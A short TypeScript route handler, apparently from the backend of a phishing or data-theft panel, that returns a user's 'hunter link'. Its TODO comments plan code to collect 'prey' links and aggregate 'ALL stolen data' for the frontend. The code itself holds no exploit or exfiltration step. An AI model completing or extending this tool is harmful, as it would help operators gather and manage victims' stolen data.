import { RouterContext } from "deps";
import {/*serviceCollection,*/ JwtService, MongoService} from "../services/services.ts"

const preys = async ({ request, response, state}: RouterContext<"/preys">) => {

    const payload = state.userId;
  
    //const mongoService = serviceCollection.get(MongoService);
    const mongoService = new MongoService();

    const databaseInformation = await mongoService.findUser("id", payload.id);

    const hunter = JSON.parse(JSON.stringify(databaseInformation)).hunter;

    
    //TODO: a function that uses hunter to get the prey link
    //TODO: a function that uses prey link yo agregate ALL stolen data
    //TODO: return that data to the frontend

  const _response = {
    success: true,
    message: {
        "your id is:": payload.id,
        "your hunter link is:": hunter
    }

  };
  response.body = JSON.stringify(_response);
};

export default preys;